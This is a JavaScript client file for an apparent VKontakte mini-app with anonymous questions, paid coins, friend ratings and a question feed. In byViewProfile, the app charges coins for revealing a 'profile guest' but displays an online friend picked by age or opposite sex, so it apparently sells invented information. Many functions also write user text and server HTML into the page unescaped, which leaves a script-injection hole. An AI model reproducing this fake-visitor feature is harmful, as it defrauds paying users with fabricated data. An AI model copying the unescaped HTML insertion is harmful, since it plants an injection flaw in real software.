    $("#question_"+id+" .message-body").first().append('' +
        '<hr style="background-color: white;">' +
        '<h5 class="title is-5">'+answer+'</h5>' +
        '<button style="margin-top: 10px;" onclick="sendMessQuestion('+id+');" class="button is-link is-fullwidth"> \n\
          Написать отправителю \n\
          <span class="tag is-danger" style="position: absolute;bottom: -15px;z-index: 2;margin: auto;">Новая функция</span> \n\
        </button>');
    $(".myAnswersEmpty").remove();
    $("#question_"+id).prependTo(".myAnswers");
    if($.trim($('.myNewAnswersItems').html()) === ""){
        $(".myNewAnswers").remove();
    }

    var count_questions = parseInt($("#count_questions").text());
    count_questions--;
    $("#count_questions").text(count_questions);
    if(count_questions < 1) {
        $("#count_questions").css("display","none");
    }

    var count_top_questions = parseInt($("#count_top_questions").text());
    count_top_questions++;
    $("#count_top_questions").text(count_top_questions);


    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "answerQuestionText",
            "viewer_id": viewer_id,
            "id": id,
            "answer": answer
        }
    });
}


function sendQuestion(uid) {
    var text = $.trim($("#questionText").val());
    if(!text){
        return false;
    }
    var is_anonim = $("#anonimSelect").val();
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "sendQuestion",
            "viewer_id": viewer_id,
            "uid": uid,
            "name": viewer.first_name+" "+viewer.last_name,
            "photo": viewer.photo_200,
            "text": text,
            "is_anonim": is_anonim
        },
        success: function (data) {
        },
        error: function (data) {
            //// $.ajax(this);
        }
    });
    $("#questionText").val("");
    //closeHardPopap();
    $("body").append('' +
        '<div style="position: fixed;z-index: 9999;opacity: 0.9;text-align: center;top: 50%;left: 50%;margin-right: -50%;transform: translate(-50%, -50%);max-width:80%;" class="alert notification is-success"> \n\
          <button onclick="$(\'.alert\').remove();" class="delete"></button> \n\
          Вопрос успешно отправлен \n\
        </div>');

    setTimeout(function() {
        $('.alert').remove();
    }, 3000);
}

function getFriendOnline() {
    for(var i = 0;i<viewer.friends.items.length;i++) {
        var frAge = 0;
        if(viewer.friends.items[i].bdate){
            frAge = getAge(viewer.friends.items[i].bdate);
        }

        if(viewer.friends.items[i].online == 1 && my_age > 0 && (my_age-2 <= frAge && my_age+7 >= frAge)){
            return viewer.friends.items[i];
        }
    }
    for(var i = 0;i<viewer.friends.items.length;i++) {
        if(viewer.friends.items[i].online == 1){
            return viewer.friends.items[i];
        }
    }
    return viewer.friends.items[0];
}

function getFriendOnlineNotMySex() {
    for(var i = 0;i<viewer.friends.items.length;i++) {
        var frAge = 0;
        if(viewer.friends.items[i].bdate){
            frAge = getAge(viewer.friends.items[i].bdate);
        }

        if(viewer.friends.items[i].sex != viewer.sex && viewer.friends.items[i].online == 1 && my_age > 0 && (my_age-2 <= frAge && my_age+7 >= frAge)){
            return viewer.friends.items[i];
        }
    }
    for(var i = 0;i<viewer.friends.items.length;i++) {
        if(viewer.friends.items[i].sex != viewer.sex && viewer.friends.items[i].online == 1){
            return viewer.friends.items[i];
        }
    }
    return viewer.friends.items[0];
}

function supportPopap() {
    var div = '<div style="position: relative;z-index: 99999999999;" id="supportPopap"> \n\
          <div onclick="closeSupportPopap()" class="modal-background" style="position: fixed;"></div> \n\
          <div style="position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 100%;z-index: 9999;padding: 20px;"> \n\
              <div style="font-size: 15px;width: 100%;background: white;padding: 20px;border-radius: 10px;"> \n\
                 <p style="margin-bottom: 10px;">Пожалуйста, напишите нарушение, по которому Вы хотите сообщить администрации о данном приложении.</p> \n\
                  <textarea style="font-size: 15px;" id="supportText" class="textarea" placeholder="Опишите нарушение" rows="2"></textarea> \n\
                  <button style="margin-top: 10px;" onclick="sendSupport();" class="button is-info is-fullwidth"> \n\
                      <span>Отправить</span> \n\
                  </button> \n\
            </div> \n\
          </div> \n\
      </div>';
    $("body").append(div);
}

function closeSupportPopap() {
    $("#supportPopap").remove();
}

function sendSupport() {
    var text = $.trim($("#supportText").val());
    if(!text){
        return false;
    }

    text+="\n\n "+viewer.first_name+" "+viewer.last_name+"\n https://vk.com/id"+viewer_id;

    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "sendSupport",
            "viewer_id": viewer_id,
            "text": text
        },
        success: function (data) {
        },
        error: function (data) {
            //// $.ajax(this);
        }
    });
    closeSupportPopap();

    var div = "<div touchstart='closeAlertSupport();'  onclick='closeAlertSupport();' id='alertSupport' style='z-index:999999999;margin:auto;top:0;left:0;width: 60%;position: fixed;margin-top: 30%;right:0;'><div style='color: #fff;background: rgba(0,0,0,.75);border-radius: 5px;box-shadow: 0 2px 15px #888;padding: 15px;text-shadow: 0 1px 0 #262626;line-height: 160%;margin: auto;font-size: 13px;cursor: pointer;'><b>Сообщение отправлено</b>.<br>Спасибо, мы рассмотрим Вашу заявку</div></div>";
    $("body").append(div);
    setTimeout(function() { closeAlertSupport(); }, 3000);
}

function closeAlertSupport() {
    $("#alertSupport").remove();
}

function sendMessQuestion(id) {
    var div = '<div style="position: relative;z-index: 99;" id="sendMessQuestionPopap"> \n\
          <div onclick="closesendMessQuestionPopap()" class="modal-background" style="position: fixed;"></div> \n\
          <div style="position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 100%;z-index: 9999;padding: 20px;"> \n\
              <div style="font-size: 17px;width: 100%;color: white;padding: 20px;border-radius: 10px;"> \n\
                 <p style="margin-bottom: 10px;">Вы можете написать автору вопроса, он увидит сообщение в приложении <br> <b>Стоимость : 50 монет</b></p> \n\
                  <textarea style="font-size: 15px;" id="sendMessQuestionText" class="textarea" placeholder="Сообщение" rows="2"></textarea> \n\
                  <button style="margin-top: 10px;" onclick="sendMessQuestionTrue('+id+');" class="button is-success is-fullwidth"> \n\
                      <span>Отправить</span></i> \n\
                  </button> \n\
                  <button style="margin-top: 50px;" onclick="closesendMessQuestionPopap();" class="button is-danger is-fullwidth"> \n\
                      <span>Закрыть</span> \n\
                      <span class="icon is-small"> \n\
                        <i class="fas fa-times"></i> \n\
                      </span> \n\
                  </button> \n\
            </div> \n\
          </div> \n\
      </div>';
    $("body").append(div);
}

function sendMessQuestionTrue(id) {
    var text = $.trim($("#sendMessQuestionText").val());
    if(!text){
        return false;
    }

    $("#progress_div").html("");
    $("#progress").css("display","");

    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "sendMessQuestionTrue",
            "viewer_id": viewer_id,
            "id": id,
            "text": text
        },
        success: function (data) {
            $("#progress").css("display","none");
            data = JSON.parse(data);
            if(data.error_monets == 1){
                $("#count_monets").text(data.monets);
                errorMonets(data.price, data.monets)
                return false;
            }else {
                $("#count_monets").text(data.monets);
                closesendMessQuestionPopap();

                $("body").append('' +
                    '<div style="position: fixed;z-index: 9999;opacity: 0.9;text-align: center;top: 50%;left: 50%;margin-right: -50%;transform: translate(-50%, -50%);max-width:80%;" class="alert notification is-success"> \n\
                      <button onclick="$(\'.alert\').remove();" class="delete"></button> \n\
                      Сообщение успешно отправлено \n\
                    </div>');

                setTimeout(function() {
                    $('.alert').remove();
                }, 3000);

            }
        },
        error: function (data) {
            //// $.ajax(this);
        }
    });

}

function closesendMessQuestionPopap() {
    $("#sendMessQuestionPopap").remove();
}

function byViewProfile() {
    $("#progress_div").html("");
    $("#progress").css("display","");

    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "byViewProfile",
            "viewer_id": viewer_id
        },
        success: function (data) {
            $("#progress").css("display","none");
            data = JSON.parse(data);
            if(data.error_monets == 1){
                $("#count_monets").text(data.monets);
                errorMonets(data.price, data.monets)
                return false;
            }else {
                $("#count_monets").text(data.monets);
                var friend = getFriendOnline();
                $("#ProfileGuest").html("<div><a target='_blank' href='https://vk.com/id"+friend.id+"'><img src='"+friend.photo_200+"'><div>"+friend.first_name+" "+friend.last_name+"</div></a></div>");
                $("#ProfileGuest").removeClass("is-danger");
            }
        },
        error: function (data) {
            //// $.ajax(this);
        }
    });
}

function errorMonets(price, my_monets) {
    closesendMessQuestionPopap();
    $("#page").css("display","none");
    $("#BottomTabs").css("display","none");
    $("#HardPopap").css("display","block");
    $("#TopPopular").css("display","none");
    $("#HardPopap").css("padding-top","60px");
    $("#backBtn").css("display","block");

    $("#HardPopapContent").html('' +
        '<div style="position: fixed;z-index: 999;opacity: 0.9;text-align: center;top: 50%;left: 50%;margin-right: -50%;transform: translate(-50%, -50%);width:80%;"> \n\
          <progress class="progress is-small" max="100">15%</progress> \n\
        </div>');

    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "errorMonets",
            "price": price,
            "my_monets": my_monets,
            "viewer_id": viewer_id,
            "name": viewer.first_name+" "+viewer.last_name,
            "is_loaded_story ": is_loaded_story,
            "permissions ": permissions,
            "vk_are_notifications_enabled": vk_are_notifications_enabled
        },
        success: function(data) {
            $("#HardPopapContent").html(data);
        }});
}

function getFreeMonetsError() {
    $("body").append('' +
        '<div style="position: fixed;z-index: 9999;text-align: center;top: 50%;left: 50%;margin-right: -50%;transform: translate(-50%, -50%);max-width:80%;" class="alert notification is-danger"> \n\
          <button onclick="$(\'.alert\').remove();" class="delete"></button> \n\
          Вы выполнили не все задания \n\
        </div>');

    setTimeout(function() {
        $('.alert').remove();
    }, 3000);
}

function getFreeMonets() {
    $("#progress_div").html("");
    $("#progress").css("display","");

    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "getFreeMonets",
            "viewer_id": viewer_id,
            "vk_are_notifications_enabled": vk_are_notifications_enabled
        },
        success: function (data) {
            $("#progress").css("display","none");
            data = JSON.parse(data);
            if(data.error == 1) {
                $("body").append('' +
                    '<div style="position: fixed;z-index: 9999;text-align: center;bottom: 0px;left: 50%;margin-right: -50%;transform: translate(-50%, -50%);width:90%;" class="alert notification is-danger"> \n\
                      <button onclick="$(\'.alert\').remove();" class="delete"></button> \n\
                      Вы выполнили не все задания \n\
                    </div>');

                setTimeout(function() {
                    $('.alert').remove();
                }, 3000);

                return false;
            }

            closeHardPopap();
            $("#count_monets").text(data.monets);

            $("body").append('' +
                '<div style="position: fixed;z-index: 9999;text-align: center;top: 50%;left: 50%;margin-right: -50%;transform: translate(-50%, -50%);max-width:80%;" class="alert notification is-success"> \n\
                  <button onclick="$(\'.alert\').remove();" class="delete"></button> \n\
                  Монеты успешно получены \n\
                </div>');

            setTimeout(function() {
                $('.alert').remove();
            }, 3000);
        },
        error: function (data) {
            //// $.ajax(this);
        }
    });
}

function openMnen(id) {
    $("#progress_div").html("");
    $("#progress").css("display","");

    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "openMnen",
            "viewer_id": viewer_id,
            "id": id
        },
        success: function (data) {
            $("#progress").css("display","none");
            data = JSON.parse(data);
            if(data.error_monets == 1){
                $("#count_monets").text(data.monets);
                errorMonets(data.price, data.monets)
                return false;
            }else {
                $("#count_monets").text(data.monets);
                $("#mnen_"+id).html(data.div);
                refreshCountMnens();
            }
        },
        error: function (data) {
            //// $.ajax(this);
        }
    });
}

function openAllMnen(monets) {
    $("#progress_div").html("");
    $("#progress").css("display","");

    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "openAllMnen",
            "viewer_id": viewer_id,
            "monets": monets
        },
        success: function (data) {
            $("#progress").css("display","none");
            data = JSON.parse(data);
            if(data.error_monets == 1){
                $("#count_monets").text(data.monets);
                errorMonets(data.price, data.monets)
                return false;
            }else {
                $("#page").html(data.div);
            }
        },
        error: function (data) {
            //// $.ajax(this);
        }
    });

}

function refreshMonets() {

    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "refreshMonets",
            "viewer_id": viewer_id
        },
        success: function (data) {
            data = JSON.parse(data);
            $("#count_monets").text(data.monets);
        },
        error: function (data) {
            //// $.ajax(this);
        }
    });
}

function copyText(text) {
    vkConnect.send("VKWebAppCopyText", {text: text});
    $(".copyText").remove();
}

function popapPayLink(link) {
    $("#progress").css("display","");
    $.ajax({
            type: "POST",
            url: link,
            data: {
                "target": "_blank"
            },
            success: function (data) {
              $("#progress").css("display","none");
              $("#monetsPacks").html(data);
              $('html, body').animate({scrollTop: 0}, 0);
            },
            error: function (data) {

            }
    });
/*

    var div = '<div class="blackPopap" style="position: relative;z-index: 9999;"> \n\
          <div onclick="closeseblackPopap()" class="modal-background" style="position: fixed;"></div> \n\
          <div style="position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 100%;z-index: 9999;padding: 20px;"> \n\
              <div style="font-size: 20px;width: 100%;color: white;padding: 20px;border-radius: 10px;"> \n\
                 <p style="margin-bottom: 10px;text-align: center;"><b>Вы можете оплатить покупку монет по ссылке</b></p> \n\
                  <input class="input" type="text" value="'+link+'" readonly=""> \n\
                  <div style="text-align: center"><button class="copyText button is-link is-light is-fullwidth" style="margin-top: 5px;" onclick="closeseblackPopap();copyText(\''+link+'\')">Скопировать ссылку</button></div> \n\
                  \<p style="margin-top: 10px;text-align: center;"><b>Вставьте ссылку в любом браузере</b></p> \n\
            </div> \n\
          </div> \n\
      </div>';
    $("body").append(div);
    */
}

function wantPopular() {
    var div = '<div class="blackPopap" style="position: relative;z-index: 9999;"> \n\
      <div onclick="closeseblackPopap()" class="modal-background" style="position: fixed;"></div> \n\
      <div style="position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 100%;z-index: 9999;padding: 20px;"> \n\
          <div style="font-size: 20px;width: 100%;color: white;padding: 20px;border-radius: 10px;"> \n\
           <div onclick="closeseblackPopap()" style="cursor: pointer;font-size: 30px;text-align: right;margin-bottom: 20px;color: #b5b5b5;"><i class="fas fa-times"></i></div> \n\
             <div style="margin-bottom: 10px;text-align: center;"><b>Битва Друзей</b></div> \n\
                \n\
                <div style=" \n\
                    border-radius: 5px; \n\
                    padding: 10px; \n\
                    text-align: center; \n\
                    width: 100%; \n\
                    font-size: 17px; \n\
                    line-height: 19px; \n\
                "> \n\
                <b>Рейтинг это сумма лайков на твоих фотографиях плюс сумма оценок от друзей</b> \n\
                 \n\
                <!--<button id="storyBtn" onclick="storyButton();" class="button is-warning is-fullwidth" style=" \n\
                    margin-top: 10px; \n\
                ">Получить голоса \n\
                </button>--> \n\
                <!--<b>Загрузим в Истории</b>--> \n\
                </div><div style=" \n\
                    border-radius: 5px; \n\
                    padding: 10px; \n\
                    text-align: center; \n\
                    width: 100%; \n\
                    font-size: 17px; \n\
                    line-height: 19px;margin-top: 20px; \n\
                "><button onclick="closeseblackPopap();changeTab(\'MyFriends\');showFriends();" class="button is-link is-fullwidth" style=" \n\
                    margin-top: 10px; \n\
                ">Топ друзей \n\
                </button> \n\
                </div> \n\
        </div> \n\
      </div> \n\
    </div>';
    $("body").append(div);
}

function myPopular() {
    $("#myPopular").text((rate+100)+"%");
}

function getLikesPopular(uid, element) {
    var count = 0;
    var code = 'var a = API.photos.get({"owner_id":'+uid+',"album_id":"profile","extended":"1","count":1000});var b = a.items@.likes;return b;';

     vkConnect.sendPromise("VKWebAppCallAPIMethod", {
        "method": "execute",
        "params": {"code": code, "v": "5.95", "access_token": token}
    }).then(data => {
         var count_likes = 0;
         for (var i = 0; i < data.response.length; i++) {
             count_likes += data.response[i].count;
         }
         count =  count_likes;
         getVotesPopular(uid, count, element)
     }).catch(error => {

      });
     return count;
}

function getVotesPopular(uid, count_likes, element) {

    var count = 0;
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "getVotesPopular",
            "uid": uid
        },
        success: function (data) {
            data = JSON.parse(data);
            count = parseInt(data.votes);
            var rate = count_likes+count;
            if(uid == viewer_id){
                my_rate = rate;
            }
            $("#"+element).text(rate+"%");
        },
        error: function (data) {
            //// $.ajax(this);
        }
    });
    return count;
}

function prepareByUser(uid) {

    $("#byUserDiv").html('<textarea id="messByUser" class="textarea" placeholder="Сообщение" rows="2"></textarea> \n\
                              <div style="margin-top: 10px;" class="select is-fullwidth"> \n\
                                  <select id="selectAnonimByUser"> \n\
                                    <option value="1" selected>Анонимный владелец</option> \n\
                                    <option value="0">Не анонимный владелец</option> \n\
                                  </select> \n\
                                </div> \n\
                              <button onclick="byUser('+uid+')" style="margin-top: 10px;" class="button is-link is-fullwidth"><strong>Купить</strong></button>');
}

function byUser(uid) {
    var message = $("#message_by").val();
    var is_anonim = $("#selectAnonimByUser :selected").val();
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "byUser",
            "viewer_id": viewer_id,
            "message": message,
            "uid": uid,
            "is_anonim": is_anonim
        },
        success: function (data) {
            $("#progress").css("display","none");
            data = JSON.parse(data);
            if(data.error_monets == 1){
                closeseblackPopap();
                $("#count_monets").text(data.monets);
                errorMonets(data.price, data.monets);
                return false;
            }else {
                showProfile(uid);
            }
        },
        error: function (data) {
        }
    });
}

function getNews(offset) {
    if(offset == 0) {
        $("#page").html('<button style="margin: 50px;" class="button is-loading">Loading</button>');
    }
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "getNews",
            "viewer_id": viewer_id,
            "offset": offset,
            "permissions": permissions
        },
        success: function(data){
            if(offset == 0){
                $("#page").html(data);
            }else{
                $("#page").append(data);
            }
        },
        error : function(data){
             //// $.ajax(this);
        }});
}

function openAllQuestion(id) {
    $(".AllQuestionsAnswers").html("");
    $("#AllQuestionsAnswer_"+id).html('<button style="margin: 10px;" class="button is-loading">Loading</button>');
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "openAllQuestion",
            "viewer_id": viewer_id,
            "id": id
        },
        success: function(data){
            $("#AllQuestionsAnswer_"+id).html(data);
        },
        error : function(data){
             //// $.ajax(this);
        }});
}

function answerAllQuestions(id) {
    var answer = $.trim($("#textAllQuestions_"+id).val());
    if(!answer){
        return false;
    }
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "answerAllQuestions",
            "viewer_id": viewer_id,
            "id": id,
            "answer": answer,
            "name": viewer.first_name,
            "photo": viewer.photo_100
        },
        success: function(data){
            openAllQuestion(id);
        },
        error : function(data){
             //// $.ajax(this);
        }});
}

function newAllQuestion() {
    var question = $.trim($("#textAllQuestion").val());
    if(!question){
        return false;
    }
    var sp = $.trim($("#spSelect").val());
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/SP/functions.php",
        data: {
            "method": "newAllQuestion",
            "viewer_id": viewer_id,
            "question": question,
            "sp": sp,
            "name": viewer.first_name,
            "photo": viewer.photo_100
        },
        success: function(data){
            getNews(0);
        },
        error : function(data){
             //// $.ajax(this);
        }});
}

function toDataURL(url, callback) {
  var xhr = new XMLHttpRequest();
  xhr.onload = function() {
    var reader = new FileReader();
    reader.onloadend = function() {
      callback(reader.result);
    };
    reader.readAsDataURL(xhr.response);
  };
  xhr.open('GET', url);
  xhr.responseType = 'blob';
  xhr.send();
}

function b64ToUint8Array(b64Image) {
    var img = atob(b64Image.split(',')[1]);
    var img_buffer = [];
    var i = 0;
    while (i < img.length) {
        img_buffer.push(img.charCodeAt(i));
        i++;
    }
    return new Uint8Array(img_buffer);
}

function declOfNum(number, words) {
    return words[(number % 100 > 4 && number % 100 < 20) ? 2 : [2, 0, 1, 1, 1, 2][(number % 10 < 5) ? number % 10 : 5]];
}
